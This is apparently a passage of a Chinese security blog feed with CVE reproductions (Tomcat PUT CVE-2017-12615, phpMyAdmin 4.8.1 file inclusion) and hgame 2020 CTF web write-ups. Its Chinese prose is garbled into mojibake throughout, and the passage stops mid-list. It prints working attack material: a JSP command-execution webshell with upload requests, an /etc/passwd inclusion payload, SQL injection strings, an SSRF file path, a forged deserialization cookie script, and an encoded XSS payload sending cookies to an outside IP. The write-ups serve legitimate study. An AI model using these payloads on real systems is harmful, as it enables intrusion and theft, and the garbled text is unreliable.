        <content type="html"><![CDATA[<h1 id="Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"><a href="#Tomcat-PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰"></a>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p><p>å¹³å°: Windows </p><p> å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•  (conf/web.xml ä¸­å¯¹äº DefaultServlet çš„ readonly è®¾ç½®ä¸º false)</p><h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><p>ä¸èƒ½ç›´æ¥ä¸Šä¼ jspç»“å°¾çš„æ–‡ä»¶</p><p>åˆ©ç”¨windowså¹³å°ä¸‹:<code>sample.txt::$DATA</code>ç­‰ä»·äº<code>sample.txt</code>çš„ç‰¹æ€§æ¥å†™shell</p><pre><code>PUT /111.jsp::$DATA HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell...</code></pre><pre><code class="java">&lt;%    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print(&quot;&lt;pre&gt;&quot;);        while((a=in.read(b))!=-1){            out.println(new String(b));        }        out.print(&quot;&lt;/pre&gt;&quot;);    }%&gt;</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><pre><code class="python">import requestsdef poc(url):    filename=&quot;tomcat_check_vuln.txt&quot;    content=&quot;test&quot;    try:        requests.put(url+&quot;/&quot;+filename,data=conetent)        res=requests.get(url+&quot;/&quot;+filename)    except :        return False    if res.status_code==200:        return True    return False</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615/](<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 rce</title>
      <link href="/2020/02/08/phpmyadmin%204.8.1%20rce/"/>
      <url>/2020/02/08/phpmyadmin%204.8.1%20rce/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p><p>ç™»é™†è´¦å·</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ç¯å¢ƒ:phpstudy 2018,windows 10</p><p>æ¼æ´ä½ç½®:<code>index.php</code>:57</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><p>éå¸¸æ˜æ˜¾çš„ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å‰é¢å‡ ä¸ªæ¡ä»¶éƒ½å¾ˆå¥½æ»¡è¶³,æˆ‘ä»¬çœ‹ä¸‹æœ€åä¸€ä¸ª<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p><p>è·Ÿè¿›å»</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])    {        if (empty($whitelist)) {            $whitelist = self::$goto_whitelist;        }        if (! isset($page) || !is_string($page)) {            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)        );        if (in_array($_page, $whitelist)) {            return true;        }        return false;    }</code></pre><p>è¦è¿”å›<code>true</code>çš„è¯,éœ€è¦<code>$page</code>ä»å¼€å¤´åˆ°ç¬¬ä¸€ä¸ª<code>?</code>ä¹‹é—´çš„å­—ç¬¦ä¸²åœ¨ç™½åå•ä¸­,æœ‰ä»¥ä¸‹ç™½åå•</p><pre><code class="php">array (  0 =&gt; &#39;db_datadict.php&#39;,....)</code></pre><p>å› ä¸ºå¤ç°ç¯å¢ƒæ˜¯åœ¨windowsä¸‹,windowsæ–‡ä»¶åä¸èƒ½åŒ…å«<code>?</code>,æ‰€ä»¥<code>db_datadict.php?</code>ä¼šå˜ä¸º<code>db_datadict.php</code>æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶,æˆ‘ä»¬ä¾¿æ— æ³•ç”¨<code>../</code>æ¥ç©¿æ¢­ç›®å½•äº†,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>$_page = urldecode($page);</code></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ <code>db_datadict.php%253f</code>æ¥ç»•è¿‡</p><p>é€šç”¨çš„payload:</p><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p><p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p><p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p><p>å¯ä»¥é€šè¿‡<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> æ¥å†™shellåˆ°æˆ‘ä»¬çš„sessionä¸­</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hgame</title>
      <link href="/2020/02/07/2020hgame/"/>
      <url>/2020/02/07/2020hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h3><blockquote><p>ä¸è¿‡æœ‰å¤§èŒ„å­å‘Šè¯‰æˆ‘çš„<strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·</strong>ä»¥åŠ GitHubï¼Œæˆ‘æ”¹èµ·æ¥ä¹ŸæŒºæ–¹ä¾¿çš„ã€‚ </p></blockquote><p>æ ¹æ®æç¤ºä¸‹è½½.git</p><pre><code class="bash">$ git remote -v#æŸ¥çœ‹git</code></pre><p>æŸ¥çœ‹æäº¤å†å²æ‹¿åˆ°flag</p><h3 id="è¡—å¤´éœ¸ç‹"><a href="#è¡—å¤´éœ¸ç‹" class="headerlink" title="è¡—å¤´éœ¸ç‹"></a>è¡—å¤´éœ¸ç‹</h3><p>è€ƒå¯Ÿå¯¹httpçš„äº†è§£</p><pre><code>GET / HTTP/1.1Host: kyaru.hgame.n3ko.coCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Cosmos BrowerAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7referer: https://vidar.club/ x-forwarded-for: 127.0.0.1If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMTConnection: close</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burpæ‹¦æˆª</p><p>ä¿®æ”¹GETä¸ºpost</p><h3 id="é¸¡ä½ å¤ªç¾"><a href="#é¸¡ä½ å¤ªç¾" class="headerlink" title="é¸¡ä½ å¤ªç¾"></a>é¸¡ä½ å¤ªç¾</h3><p>æ‹¦æˆªajaxè¯·æ±‚,ä¿®æ”¹åˆ†æ•°</p><h3 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h3><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();//Only for debugif (DEBUG_MODE){    if(isset($_GET[&#39;debug&#39;])) {        $debug = $_GET[&#39;debug&#39;];        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {            die(&quot;args error!&quot;);        }        eval(&quot;var_dump($$debug);&quot;);    }}if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}else {    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];            header(&quot;Location: admin.php&quot;);            exit();        }        else {            echo &quot;Ã§Â”Â¨Ã¦ÂˆÂ·Ã¥ÂÂÃ¦ÂˆÂ–Ã¥Â¯Â†Ã§ ÂÃ©Â”Â™Ã¨Â¯Â¯&quot;;        }    }}?&gt;</code></pre><p>adminpassword: 0e114902927253523756713132279690 </p><p>å¯†ç ä½¿ç”¨==æ¥è¿›è¡Œmd5æ ¡éªŒ,æ‰¾ä¸ª0eå¼€å¤´çš„å¯†ç å³å¯ç»•è¿‡(QNKCDZO)</p><p>adminusername: Cosmos! </p><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);session_start();if(isset($_SESSION[&#39;username&#39;])) {    header(&quot;Location: admin.php&quot;);    exit();}$action = @$_GET[&#39;action&#39;];$filter = &quot;/config|etc|flag/i&quot;;if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {    if(preg_match($filter, $_GET[&#39;action&#39;])) {        echo &quot;Hacker get out!&quot;;        exit();    }        include $action;}elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {    header(&quot;Location: ?action=login.php&quot;);    exit();}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;session_start();if(!isset($_SESSION[&#39;username&#39;])) {    header(&#39;Location: index.php&#39;);    exit();}function insert_img() {    if (isset($_POST[&#39;img_url&#39;])) {        $img_url = @$_POST[&#39;img_url&#39;];        $url_array = parse_url($img_url);        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {            return false;        }           $c = curl_init();        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));    }}?&gt;&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;</code></pre><p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p><p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p><h3 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h3><p>å•å¼•å·é—­åˆ</p><p>è¿‡æ»¤:select</p><p>é»‘åå•:ç©ºæ ¼</p><pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#information_schema,easysql0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#f1aggggggggggggg,messages#GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;fl4444444ghgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h3><p>php</p><pre><code class="php">&lt;?php// function encrypt($str){//     $result = &#39;&#39;;//     for($i = 0; $i &lt; strlen($str); $i++){//         $result .= chr(ord($str[$i]) + 1);//     }//     return $result;// }function encrypt($str){    $result = &#39;&#39;;    for($i = 0; $i &lt; strlen($str); $i++){        $result .= chr(ord($str[$i]) - 1);    }    return $result;}$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;){    $arr=array();    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);    $newcmd=$arr[0].$newcmd.&quot;)&quot;;        $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);}$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    $dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);?&gt;</code></pre><p>python </p><pre><code class="python">import requestsdef get_flag():    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]    enccmd=enccmd[:len(enccmd)-75]    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text    data={&quot;token&quot;:dec}    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])get_flag()</code></pre><h3 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre><p>è¾“å…¥ä¼šå˜æˆå¤§å†™</p><h3 id="åºåˆ—ä¹‹äº‰-Ordinal-Scale"><a href="#åºåˆ—ä¹‹äº‰-Ordinal-Scale" class="headerlink" title="åºåˆ—ä¹‹äº‰ - Ordinal Scale"></a>åºåˆ—ä¹‹äº‰ - Ordinal Scale</h3><p>è¿™ä¸€é¢˜è¦è®©<code>$_SESSION[&#39;rank&#39;]===1</code>æ—¶,æœ‰flag</p><p>è€Œé»˜è®¤çš„é€»è¾‘æ˜¯æ²¡æ³•å®ç°çš„</p><pre><code class="php">        if($this-&gt;rank &lt;= 2){                $this-&gt;rank = 2;            }</code></pre><p>é˜…è¯»ä»£ç å‘ç°ååºåˆ—åŒ–ç‚¹:</p><p><code>Monster</code>çš„<code>__construct</code>æ–¹æ³•</p><pre><code class="php">public function __construct($key){        $this-&gt;encryptKey = $key;        if(!isset($_COOKIE[&#39;monster&#39;])){            $this-&gt;Set();            return;        }        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }        $this-&gt;Set();         }</code></pre><p>ä½†æ˜¯è¦çŸ¥é“<code>$key</code>æ‰èƒ½ååºåˆ—åŒ–</p><p>åœ¨<code>Game</code>çš„<code>__construct</code>æ–¹æ³•ä¸­çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²<code>$key</code></p><pre><code class="php">class Game{       private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    private $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign        $this-&gt;monster = new Monster($this-&gt;sign);        $this-&gt;rank = new Rank();    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}</code></pre><p>å¯ä»¥ååºåˆ—åŒ–å,æˆ‘ä»¬å‘ç°<code>Fight</code>çš„<code>__destruct</code>æ–¹æ³•å¯ä»¥ä¿®æ”¹<code>$_SESSION[&#39;rank&#39;]</code></p><pre><code class="php">public function __destruct(){        // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];        if($this-&gt;key === $this-&gt;serverKey){            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;        }else{            // éæ­£å¸¸è®¿é—®            session_start();            session_destroy();            setcookie(&#39;monster&#39;, &#39;&#39;);            header(&#39;Location: index.php&#39;);            exit;        }    }</code></pre><p>ä½†æ˜¯è¿˜æœ‰<code>$this-&gt;key === $this-&gt;serverKey</code>é˜»æŒ è¿™æˆ‘ä»¬</p><p>å¦‚æœæˆ‘ä»¬èƒ½è·å¾—æˆ–ä¿®æ”¹<code>$_SERVER[&#39;key&#39;]</code>,ä¾¿å¯ä»¥æ‹¿åˆ°flagäº†</p><p>phpååºåˆ—åŒ–æœ‰ä¸ªç‰¹æ€§,ååºåˆ—åŒ–æ—¶,è‹¥å¯¹è±¡æ²¡æœ‰æŸä¸ªå€¼,ä¾¿ä¼šæ¢å¤æˆè¯¥å¯¹è±¡å¯¹åº”çš„ç±»çš„é»˜è®¤å€¼</p><p>å¦‚:</p><pre><code class="php">&lt;?phpclass test{    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;    public function __destruct()    {        echo $this-&gt;my_static;    }}class tesa{}$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));unserialize($a);ç»“æœ:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre><p>äºæ˜¯æ„é€ </p><pre><code class="php">&lt;?phpclass Game{    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;    public $sign = &#39;&#39;;    public $rank;//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL    public function __construct($playerName){        $_SESSION[&#39;player&#39;] = $playerName;        if(!isset($_SESSION[&#39;exp&#39;])){            $_SESSION[&#39;exp&#39;] = 0;        }        $data = [$playerName, $this-&gt;encryptKey];        $this-&gt;init($data);//set sign    }    private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }}class Rank{    private $rank;//    private $serverKey;     // æœåŠ¡å™¨çš„ Key//    private $key;    public function __construct()    {        $this-&gt;rank=1;    }    public function __destruct(){    }}$s=new Rank();//$s=array(&#39;name&#39;=&gt;&#39;è”¡å»ºæ–Œ&#39;,&#39;no&#39;=&gt;999999999999999999);$a=new Game($_GET[&#39;name&#39;]);$sign = md5(serialize($s) . $a-&gt;sign);print( base64_encode(serialize($s) . $sign));?&gt;</code></pre><h3 id="äºŒå‘å…¥é­‚"><a href="#äºŒå‘å…¥é­‚" class="headerlink" title="äºŒå‘å…¥é­‚"></a>äºŒå‘å…¥é­‚</h3><p>åˆšçœ‹åˆ°è¿™é¢˜æ—¶æ˜¯æœ‰ç‚¹æ‡µçš„,ç½‘é¡µçš„å›¾ç‰‡æ˜¯å¦™è›™ç§å­,æ˜¯æƒ³è¯´äº¤ç§å­ä¸Šå»,ä½†æˆ‘æ²¡çœ‹æ‡‚/////</p><p>å‰ä¸€æ®µæ—¶é—´çˆ†å‡ºæ¥çš„mt_srandé€†å‘åˆšå¥½å¯ä»¥ç”¨åˆ°</p><p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p><pre><code class="php">import requestsimport osburp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).texta=eval(result)p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )x=p.read().strip()burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}burp0_data = {&quot;ans&quot;: x}print(burp0_data)result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).textprint(result)</code></pre><h3 id="Cosmosçš„äºŒæ‰‹å¸‚åœº"><a href="#Cosmosçš„äºŒæ‰‹å¸‚åœº" class="headerlink" title="Cosmosçš„äºŒæ‰‹å¸‚åœº"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h3><h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>å¼±å¯†ç ç™»é™†åˆ«äººè´¦å·,ç›´æ¥æŠ„ä½œä¸š</p><p>admin,123456</p><h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>æ¡ä»¶ç«äº‰</p><p>åœ¨ä¸€æ¬¡å¶ç„¶çš„çˆ†ç ´ä¸­æˆ‘å‘ç°,å•†å“çš„æ•°é‡å¤šäº†,äºæ˜¯ä¾¿çŒœæµ‹æœ‰æ¡ä»¶ç«äº‰æ¼æ´</p><p>æˆ‘æ¥æ¨¡æ‹Ÿä»¥ä¸‹é€ æˆæ¡ä»¶ç«äº‰æ¼æ´çš„åŸå› </p><p>é¦–å…ˆçŒœæµ‹ä»¥ä¸‹solveå’Œbuyæ–¹æ³•çš„æµç¨‹</p><pre><code class="php">function solve(){    #1. $num=ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾è¦ç”¨æˆ·æŒæœ‰çš„å–å‡ºå•†å“çš„ä¸ªæ•°    #2. å¦‚æœæ•°é‡è¶³å¤Ÿ,åˆ™è¿›è¡Œä¸‹ä¸€æ­¥,å¦åˆ™è¿”å›å¹¶æŠ¥é”™    #3. åœ¨æ•°æ®åº“ä¸­å¢åŠ ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±    #4. åœ¨æ•°æ®åº“ä¸­å‡å°‘ç”¨æˆ·æ‹¥æœ‰è¯¥å•†å“çš„æ•°é‡}</code></pre><p>å‡è®¾webæœåŠ¡å™¨åœ¨ç›¸å·®ä¸€ä¸ªæ­¥éª¤çš„æ—¶é—´æ—¶æ”¶åˆ°ä¸¤ä¸ªè¯·æ±‚,æ­¤æ—¶forkå‡ºä¸¤ä¸ªè¿›ç¨‹a,b,è®¾æ­¤æ—¶å•†å“æ•°é‡ä¸º1,ä¸¤ä¸ªè¯·æ±‚è¦å–å‡ºçš„æ•°é‡ä¹Ÿéƒ½ä¸º1</p><ol><li>a 